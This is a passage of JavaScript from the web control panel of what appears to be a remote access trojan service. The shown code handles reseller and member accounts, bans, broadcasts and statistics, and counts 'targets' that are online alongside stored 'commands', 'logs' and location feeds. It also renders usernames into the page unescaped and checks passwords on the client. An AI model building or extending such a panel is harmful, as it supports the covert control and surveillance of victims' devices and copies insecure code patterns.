  box.innerHTML = `<h3>${action}</h3>` + (forms[action] || '<div class="sub">Coming soon.</div>') + `<div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  const btn = $("#btn-submit-action");
  
  if (action === "Add User" || action === "Add Member") {
    btn.onclick = async () => {
      haptic(15);
      const usn = $("#f-usn").value.trim();
      const pw = $("#f-pw").value;
      const role = action === "Add Member" ? "member" : ($("#f-role")?.value || "member");
      const days = $("#f-days").value;
      if (!usn || !pw) return toast("Isi semua", "err");
      if (pw.length < 6) return toast("Password min 6", "err");
      try {
        const usersSnap = await fbGet(fbRef(State.db, "users"));
        const users = usersSnap.exists() ? usersSnap.val() : {};
        for (const uid in users) {
          if (users[uid].username === usn) return toast("Username udah dipake", "err");
        }
        const salt = genSalt();
        const hash = await sha256(pw + salt);
        const userCode = genUserCode();
        const newRef = fbPush(fbRef(State.db, "users"));
        await fbSet(newRef, {
          username: usn,
          passwordHash: hash,
          passwordSalt: salt,
          role, userCode,
          createdBy: State.uid,
          createdAt: Date.now(),
          expiresAt: days ? Date.now() + parseInt(days) * 86400000 : null,
          banned: false, avatar: ""
        });
        toast(`Akun ${usn} dibuat. Code: ${userCode}`, "ok", 6000);
        closeModal();
      } catch (e) {
        toast("Gagal: " + e.message, "err");
      }
    };
  }
  
  if (action === "Ban User") {
    btn.onclick = async () => {
      haptic(15);
      const usn = $("#f-ban-usn").value.trim();
      if (!usn) return toast("Isi", "err");
      const s = await fbGet(fbRef(State.db, "users"));
      const u = s.val() || {};
      for (const uid in u) {
        if (u[uid].username === usn) {
          await fbUpdate(fbRef(State.db, "users/" + uid), { banned: true });
          toast(`User ${usn} di-ban`, "ok");
          closeModal();
          return;
        }
      }
      toast("Gak ada", "err");
    };
  }
  
  if (action === "Reset Password") {
    btn.onclick = async () => {
      haptic(15);
      const usn = $("#f-reset-usn").value.trim();
      const pw = $("#f-reset-pw").value;
      if (!usn || !pw) return toast("Isi", "err");
      if (pw.length < 6) return toast("Min 6", "err");
      const s = await fbGet(fbRef(State.db, "users"));
      const u = s.val() || {};
      for (const uid in u) {
        if (u[uid].username === usn) {
          const salt = genSalt();
          const hash = await sha256(pw + salt);
          await fbUpdate(fbRef(State.db, "users/" + uid), { passwordHash: hash, passwordSalt: salt });
          toast("Direset", "ok");
          closeModal();
          return;
        }
      }
      toast("Gak ada", "err");
    };
  }
  
  if (action === "Extend Member") {
    btn.onclick = async () => {
      haptic(15);
      const usn = $("#f-ext-usn").value.trim();
      const days = parseInt($("#f-ext-days").value);
      if (!usn) return toast("Isi", "err");
      const s = await fbGet(fbRef(State.db, "users"));
      const u = s.val() || {};
      for (const uid in u) {
        if (u[uid].username === usn) {
          const base = u[uid].expiresAt && u[uid].expiresAt > Date.now() ? u[uid].expiresAt : Date.now();
          await fbUpdate(fbRef(State.db, "users/" + uid), { expiresAt: base + days * 86400000 });
          toast(`+${days} hari`, "ok");
          closeModal();
          return;
        }
      }
      toast("Gak ada", "err");
    };
  }
  
  if (action === "Broadcast") {
    btn.onclick = async () => {
      haptic(15);
      const title = $("#f-bc-title").value.trim();
      const msg = $("#f-bc-msg").value.trim();
      const img = $("#f-bc-img").value.trim();
      const url = $("#f-bc-url").value.trim();
      if (!msg) return toast("Isi pesan", "err");
      const bRef = fbPush(fbRef(State.db, "broadcasts"));
      await fbSet(bRef, { title, message: msg, image: img, url, fromUid: State.uid, createdAt: Date.now() });
      toast("Terkirim", "ok");
      closeModal();
    };
  }
  
  if (action === "Manage User" || action === "Manage Member") {
    const s = $("#f-search");
    s.oninput = () => {
      clearTimeout(window._st);
      window._st = setTimeout(() => searchUsers(s.value, action), 400);
    };
  }
  
  if (action === "Statistics") loadStats();
  if (action === "Database") loadDB();
}

async function searchUsers(q, action) {
  const list = $("#user-list");
  if (!q) {
    list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div>';
    return;
  }
  try {
    const snap = await fbGet(fbRef(State.db, "users"));
    const users = snap.exists() ? snap.val() : {};
    const results = [];
    for (const uid in users) {
      const u = users[uid];
      if (u.username.toLowerCase().includes(q.toLowerCase())) {
        if (action === "Manage Member" && u.role !== "member") continue;
        results.push({ uid, ...u });
      }
    }
    if (results.length === 0) {
      list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Gak ditemukan</div>';
      return;
    }
    list.innerHTML = results.map(u => `
      <div class="list-item" style="margin-bottom:8px;cursor:default">
        <div class="ico-badge"><i class="fa-solid fa-user"></i></div>
        <div class="txt">
          <div class="n">${u.username}</div>
          <div class="d">${u.role} · ${u.banned ? "banned" : "active"} · ${u.userCode || "—"}</div>
        </div>
      </div>`).join("");
  } catch (e) {}
}

async function loadStats() {
  const box = $("#stat-content");
  try {
    const users = (await fbGet(fbRef(State.db, "users"))).val() || {};
    const targets = (await fbGet(fbRef(State.db, "targets"))).val() || {};
    let totalUsers = 0, owners = 0, resellers = 0, members = 0, vips = 0, banned = 0;
    for (const uid in users) {
      totalUsers++;
      if (users[uid].role === "owner") owners++;
      if (users[uid].role === "reseller") resellers++;
      if (users[uid].role === "member") members++;
      if (users[uid].role === "vip") vips++;
      if (users[uid].banned) banned++;
    }
    let tt = 0, ot = 0;
    for (const tid in targets) {
      tt++;
      if (targets[tid].status === "online") ot++;
    }
    box.innerHTML = `
      <div class="stat-grid">
        <div class="stat-card"><div class="l">Total Users</div><div class="v accent">${totalUsers}</div></div>
        <div class="stat-card"><div class="l">Targets</div><div class="v info">${tt}</div></div>
        <div class="stat-card"><div class="l">Online</div><div class="v success">${ot}</div></div>
        <div class="stat-card"><div class="l">Banned</div><div class="v warn">${banned}</div></div>
        <div class="stat-card"><div class="l">Owners</div><div class="v accent">${owners}</div></div>
        <div class="stat-card"><div class="l">Resellers</div><div class="v success">${resellers}</div></div>
        <div class="stat-card"><div class="l">VIP</div><div class="v" style="color:var(--vip)">${vips}</div></div>
        <div class="stat-card"><div class="l">Members</div><div class="v info">${members}</div></div>
      </div>`;
  } catch (e) {
    box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal</div>';
  }
}

async function loadDB() {
  const box = $("#db-content");
  try {
    const nodes = ["users", "targets", "commands", "logs", "broadcasts"];
    const rows = [];
    for (const n of nodes) {
      try {
        const s = await fbGet(fbRef(State.db, n));
        const c = s.exists() ? Object.keys(s.val()).length : 0;
        rows.push(`<div class="list-item" style="margin-bottom:8px;cursor:default"><div class="ico-badge"><i class="fa-solid fa-database"></i></div><div class="txt"><div class="n" style="font-family:'JetBrains Mono',monospace">/${n}</div></div><div style="font-weight:700;color:var(--accent-hover)">${c}</div></div>`);
      } catch (e) {}
    }
    box.innerHTML = rows.join("");
  } catch (e) {}
}

// ============================================================
// SETTINGS / LOGOUT
// ============================================================
function openSettings() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Settings</h3><div class="sub">Ubah password</div>
    <div class="field"><label>Password Lama</label><input type="password" id="set-old"></div>
    <div class="field"><label>Password Baru</label><input type="password" id="set-new"></div>
    <div class="field"><label>Konfirmasi</label><input type="password" id="set-conf"></div>
    <button class="btn btn-primary" id="btn-save-pw"><i class="fa-solid fa-floppy-disk"></i> Save</button>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>`;
  $("#modal").classList.add("show");
  $("#btn-save-pw").onclick = async () => {
    haptic(15);
    const o = $("#set-old").value;
    const n = $("#set-new").value;
    const c = $("#set-conf").value;
    if (!o || !n) return toast("Isi", "err");
    if (n !== c) return toast("Konfirm gak cocok", "err");
    if (n.length < 6) return toast("Min 6", "err");
    const oh = await sha256(o + State.user.passwordSalt);
    if (oh !== State.user.passwordHash) return toast("Password lama salah", "err");
    const salt = genSalt();
    const hash = await sha256(n + salt);
    await fbUpdate(fbRef(State.db, "users/" + State.uid), { passwordHash: hash, passwordSalt: salt });
    State.user.passwordHash = hash;
    State.user.passwordSalt = salt;
    toast("Diubah", "ok");
    closeModal();
  };
}

function doLogout() {
  haptic(15);
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Log Out</h3><div class="sub">Yakin?</div>
    <div class="modal-actions">
      <button class="btn btn-ghost" onclick="closeModal()">Batal</button>
      <button class="btn btn-primary" onclick="confirmLogout()">Log Out</button>
    </div>`;
  $("#modal").classList.add("show");
}

function confirmLogout() {
  localStorage.removeItem("bluxus_uid");
  State.user = null;
  State.uid = null;
  if (State.audio) { State.audio.pause(); State.audio = null; }
  if (State.unsubLive) State.unsubLive();
  if (State.unsubLoc) State.unsubLoc();
  closeModal();
  showScreen("login");
  $("#login-usn").value = "";
  $("#login-pw").value = "";
}

function closeModal() {
  $("#modal").classList.remove("show");
}

// ============================================================
// EVENTS
// ============================================================
function bindEvents() {
  $("#btn-login").onclick = doLogin;
  $("#login-pw").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
  
  ["", "-rat", "-tools", "-account", "-about", "-panel", "-anime"].forEach(suf => {
    const b = $("#btn-hamburger" + suf);
    if (b) b.onclick = openSidebar;
  });
  
  $("#sidebar-backdrop").onclick = closeSidebar;
  $$(".sb-item").forEach(el => { el.onclick = () => goPage(el.dataset.page); });
  
  $("#btn-settings").onclick = () => { haptic(10); openSettings(); };
  $("#btn-logout").onclick = doLogout;
  $("#btn-change-photo").onclick = () => { haptic(10); toast("Fitur dalam pengembangan", "info"); };
  $("#modal").addEventListener("click", e => { if (e.target.id === "modal") closeModal(); });
  
  initPlayer();
  initAnimeEvents();

  // Copy user code di Rat
  $("#btn-copy-usercode").onclick = async () => {
    haptic(20);
    const code = State.user?.userCode || "";
    if (!code) return toast("User code kosong", "err");
    const ok = await copyToClipboard(code);
    const btn = $("#btn-copy-usercode");
    if (ok) {
      toast("User code di-copy", "ok");
      btn.classList.add("copied");
      btn.innerHTML = '<i class="fa-solid fa-check"></i>';
      setTimeout(() => {
        btn.classList.remove("copied");
        btn.innerHTML = '<i class="fa-solid fa-copy"></i>';
      }, 2000);
    } else {
      toast("Gagal copy", "err");
    }
  };
}

// ============================================================
// INIT
// ============================================================
async function init() {
  bindEvents();
  runLoading();

  setTimeout(async () => {
    try {
      await loadFirebaseSDK();
      watchConnection();
    } catch (e) {
      console.error("Init error:", e);
      $("#loading-text").textContent = "Error: gagal connect";
      return;
    }

    const resumed = await tryResume();
    if (resumed) {
      $("#login-redirect").classList.add("show");
      setTimeout(() => goDashboard(), 700);
    }
  }, 2500);
}

window.addEventListener("DOMContentLoaded", init);
window.closeModal = closeModal;
window.confirmLogout = confirmLogout;